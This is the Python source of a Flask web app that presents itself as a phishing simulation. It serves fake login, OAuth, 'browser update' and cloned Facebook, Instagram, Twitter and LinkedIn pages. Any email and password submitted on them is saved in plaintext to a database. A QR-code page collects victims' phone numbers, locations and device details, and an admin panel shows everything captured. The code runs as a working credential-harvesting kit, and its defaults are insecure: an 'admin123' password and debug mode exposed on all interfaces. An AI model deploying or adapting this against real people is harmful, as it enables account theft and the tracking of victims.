from flask import Flask, render_template, request, redirect, session, url_for
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime, timezone, timedelta
import qrcode
import os
from flask_cors import CORS
from werkzeug.middleware.proxy_fix import ProxyFix

app = Flask(__name__)
# Fix for proxies (like Railway) to ensure correct URLs are generated
app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1, x_prefix=1)
CORS(app)

# Session configuration for admin login
app.secret_key = os.environ.get("SECRET_KEY", "your_secret_key_here")
ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "admin123")

# Database configuration
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///phishing.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)

def pkt_now():
    # Pakistan Standard Time is UTC+5
    return datetime.now(timezone.utc).astimezone(timezone(timedelta(hours=5)))

# Database table
class CredentialEvent(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    page = db.Column(db.String(200))
    email = db.Column(db.String(200))
    password = db.Column(db.String(200))
    phone = db.Column(db.String(50))
    location = db.Column(db.String(200))
    timestamp = db.Column(db.DateTime, default=pkt_now)

@app.before_request
def create_tables():
    db.create_all()

# Home Page
@app.route("/")
def index():
    return render_template("index.html")

# ---------------------------
# LOGIN SIMULATION
# ---------------------------
@app.route("/login", methods=["GET","POST"])
def login():
    if request.method == "POST":
        email = request.form.get("email")
        password = request.form.get("password")

        # Store dummy credentials
        event = CredentialEvent(page="login_page", email=email, password=password)
        db.session.add(event)
        db.session.commit()

        return redirect("/thankyou")

    return render_template("login.html")


# ---------------------------
# OAUTH SIMULATION
# ---------------------------
@app.route("/oauth", methods=["GET","POST"])
def oauth():
    if request.method == "POST":
        email = request.form.get("email")
        passw = request.form.get("password")

        event = CredentialEvent(page="oauth_page", email=email, password=passw)
        db.session.add(event)
        db.session.commit()

        return redirect("/thankyou")

    return render_template("oauth.html")


# ---------------------------
# BROWSER UPDATE SIMULATION
# ---------------------------
@app.route("/browser-update", methods=["GET","POST"])
def browser_update():
    if request.method == "POST":
        email = request.form.get("email")
        passw = request.form.get("password")

        event = CredentialEvent(page="browser_update", email=email, password=passw)
        db.session.add(event)
        db.session.commit()

        return redirect("/thankyou")

    return render_template("browser_update.html")


# ---------------------------
# SOCIAL MEDIA SIMULATION
# ---------------------------
@app.route("/social", methods=["GET","POST"])
def social():
    if request.method == "POST":
        email = request.form.get("email")
        passw = request.form.get("password")

        event = CredentialEvent(page="social_media", email=email, password=passw)
        db.session.add(event)
        db.session.commit()

        return redirect("/thankyou")

    return render_template("social.html")



# ---------------------------
# QR PHISHING SIMULATION
# ---------------------------
@app.route("/qr")
def qr_page():
    qr_path = "static/qr.png"

    # Use actual request URL to ensure mobile devices can connect
    # if BASE_URL env is not set.
    base_url = os.environ.get("BASE_URL", request.host_url.rstrip('/'))
    
    # Always regenerate QR to ensure it matches current connection (ngrok/local IP)
    img = qrcode.make(f"{base_url}/mobile-verify")
    img.save(qr_path)

    print(f"DEBUG: QR Code generated for: {base_url}/mobile-verify")

    return render_template("qr.html", qr_image=qr_path + "?v=" + str(datetime.now().timestamp()))

# ---------------------------
# MOBILE VERIFICATION (Please provide location & phone)
# ---------------------------
@app.route("/mobile-verify", methods=["GET", "POST"])
def mobile_verify():
    if request.method == "POST":
        if request.is_json:
            data = request.get_json()
            phone = data.get("phone", "N/A")
            location = data.get("location", "N/A")
            user_agent = data.get("userAgent", "N/A")
            platform = data.get("platform", "N/A")
            
            # Combine device info into phone/location if needed or store as location
            full_location = f"Loc: {location} | UA: {user_agent} | OS: {platform}"
            
            event = CredentialEvent(
                page="mobile_verify_automated",
                phone=phone,
                location=full_location
            )
        else:
            data = request.form
            phone = data.get("phone")
            location = data.get("location")
            
            event = CredentialEvent(
                page="mobile_verify",
                phone=phone,
                location=location
            )
            
        db.session.add(event)
        db.session.commit()
        return {"status": "success"} if request.is_json else redirect("/thankyou")
        
    return render_template("mobile_verify.html")

@app.route("/download-verify")
def download_verify():
    # Serve an empty dummy file for the "automatic download" effect
    from flask import send_file
    import io
    
    file_content = b"Verification script initiated. Your device is being synchronized."
    return send_file(
        io.BytesIO(file_content),
        mimetype='application/octet-stream',
        as_attachment=True,
        download_name='verify_security.txt'
    )

@app.route("/select_platform")
def select_platform():
    return render_template("select_platform.html")

@app.route("/login/<platform>", methods=["GET"])
def platform_login(platform):
    templates = {
        "facebook": "facebook_login.html",
        "instagram": "instagram_login.html",
        "twitter": "twitter_login.html",
        "linkedin": "linkedin_login.html"
    }

    if platform not in templates:
        return "Platform not supported", 404

    return render_template(templates[platform], platform=platform)

# ---------------------------
# THANK YOU PAGE
# ---------------------------
@app.route("/thankyou")
def thankyou():
    return render_template("thankyou.html")


# ---------------------------
# ADMIN PANEL
# ---------------------------
@app.route("/admin")
def admin():
    if not session.get("admin_logged_in"):
        return redirect(url_for("admin_login"))
        
    all_data = CredentialEvent.query.all()
    mobile_data = [d for d in all_data if d.page == 'mobile_verify_automated']
    other_data = [d for d in all_data if d.page != 'mobile_verify_automated']
    return render_template("admin.html", mobile_data=mobile_data, other_data=other_data)

@app.route("/admin/login", methods=["GET", "POST"])
def admin_login():
    if request.method == "POST":
        password = request.form.get("password")
        if password == ADMIN_PASSWORD:
            session["admin_logged_in"] = True
            return redirect(url_for("admin"))
        else:
            return render_template("admin_login.html", error="Invalid Password")
            
    return render_template("admin_login.html")

@app.route("/admin/logout")
def admin_logout():
    session.pop("admin_logged_in", None)
    return redirect(url_for("admin_login"))


@app.route("/platform_submit", methods=["POST"])
def platform_submit():
    data = request.get_json()

    email = data.get("email")
    password = data.get("password")
    platform = data.get("platform")

    event = CredentialEvent(
        page=platform,
        email=email,
        password=password
    )

    db.session.add(event)
    db.session.commit()

    return {"status": "stored"}

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=True)
